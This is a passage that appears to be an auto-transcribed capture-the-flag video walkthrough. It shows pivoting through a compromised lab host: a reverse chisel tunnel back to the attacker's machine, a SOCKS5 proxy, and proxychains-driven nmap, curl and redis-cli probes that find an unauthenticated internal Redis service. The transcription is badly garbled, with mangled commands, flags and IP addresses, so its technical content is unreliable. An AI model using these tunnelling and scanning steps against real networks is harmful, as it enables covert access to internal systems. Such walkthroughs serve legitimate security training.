chisel server that allows socks5 connections and now anything we send over put 8001 goes through this tunnel and hits the chisel server so that means back on our box we can run a chisel client on the localhost and point it to 8001 and go through and then we get the Sox client so let's just look at exactly how this works and what benefit this provides to us so I've reconnected the box and killed all my chisel connections so we should be at a clean slate the first thing we want to do is stand up a chisel server on a Kalibak so we do chisel server - P 8000 reverse and then we want to stand up the client so tap chisel client 10 10 14 3 port 8000 we want a reverse connection 8000 one one 2700 one lead and we see we get a connection back we are listening so now we have to stand up the server so tap chisel server - P leet and we want - - socks5 to allow a soft client so now back on our box we can run another chisel so dot slash chisel client one 27001 and port 8000 one and we want to be Sox and it doesn't look like it worked because I have a typo I put it all there for some reason connect here we are connected and now if we do a net stat al NP grep for 1080 we see we have chisel listening on that socket so we should be able to do n map - - proxy socks5 172 19:03 port 80 tcp and that doesn't work let's try that - proxy that way and do proxy - tight socks5 how much I had to do it with nmap flags let's just do ed see proxy chains we have Sox 5-1 27001 on 1080 we also have a quiet mood uncommented if we don't have this then it's pretty noisy noisy as in like we'll do it after this so we do proxy chains and map - st 172 1903 - P 80 and we'll do 22 as well let's see if this does work we also have to specify - capital P n because we can't ping the host and we can see that 80 is open 22 is not and if we took off that quite option because I think that's default of quiet being disabled and do this we see all the output from proxy chains I just don't like that so we can disable that and then voila we could also do proxy chains curl 170 to 1903 do it that way I also have I think Redis installed on my Kali box is it let's see that is client writer CLI proxy change write a COI on 172 1902 I guess there's a dash H maybe there we go and then we could also do it this way so this is echo no authentication and we can see no other indication is on that Redis instance so that is how you do the socks proxy if you want to do and that would also make this box a lot easier so hope you guys enjoyed the video take care and I will see you all next week